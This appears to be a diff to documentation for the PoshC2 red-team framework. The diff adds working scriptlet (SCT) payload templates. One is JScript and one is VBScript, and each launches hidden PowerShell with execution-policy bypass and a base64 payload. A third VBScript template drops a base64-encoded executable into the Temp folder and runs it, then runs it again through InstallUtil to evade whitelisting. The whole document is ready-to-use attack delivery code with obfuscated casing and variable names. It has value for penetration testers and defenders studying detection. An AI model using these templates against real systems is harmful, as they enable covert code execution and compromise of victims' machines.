@@ -2,8 +2,70 @@
 SCT Files
 ############
 
-rg_sct
+SCT Files can be used in many execution methods, most of which have been discovered by SubTee. PoshC2 utilised a few of 
+these methods and hosts these seperately so you can use this for execution. 
 
-cs_sct
+JScript Powershell Execution
+##############################
+.. code-block:: powershell
+	
+	<sCrIptlEt><scRIPt>
+	a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec bypass -Noninteractive -windowstyle hidden -e <base64 encoded payload>","","open","0");
+	</scRIPt></sCrIptlEt>
 
-df_sct
+VBScript Execute EXE with InstallUtil
+#######################################
+.. code-block:: powershell
+	
+	<sCrIptlEt>
+	<ScRIpt language="VBSCRIPT">
+	102bi06dul = "<base64 encoded standalone executable>"
+
+	Dim fso
+	Dim fdsafdsa
+	Dim oNode, fdsaa
+	Const adTypeBinary = 1
+	Const adSaveCreateOverWrite = 2
+
+	Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
+	oNode.dataType = "bin.base64"
+	oNode.Text = 102bi06dul
+	Set fdsaa = CreateObject("ADODB.Stream")
+	fdsaa.Type = adTypeBinary
+	tempdir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
+	LocalFile = tempdir & "\102bi06dul.exe"
+	fdsaa.Open
+	fdsaa.Write oNode.nodeTypedValue
+	fdsaa.SaveToFile LocalFile, adSaveCreateOverWrite
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set fdsafdsa = CreateObject("WScript.Shell")
+	If (fso.FileExists(LocalFile)) Then
+	    fdsafdsa.Exec (LocalFile)
+	End If
+	LocalFileNew = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
+	If (fso.FileExists(LocalFileNew)) Then
+	    fdsafdsa.Exec ("C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U " & LocalFile)
+	End If
+	</ScRIpt></sCrIptlEt>
+
+
+VBScript Powershell Execution
+################################
+.. code-block:: powershell
+
+	<?XML version="1.0"?>
+	<scriptlet>
+
+	<registration 
+	    progid="PoC"
+	    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+	<script language="VBScript">
+	Dim ghgfhgfh
+	set ghgfhgfh = CreateObject("shell.application")
+	ghgfhgfh.ShellExecute "powershell.exe", " -exec bypass -Noninteractive -windowstyle hidden -e <base64 encoded payload>", "", "open", 0
+	</script>
+
+	</registration>
+	</scriptlet>
+
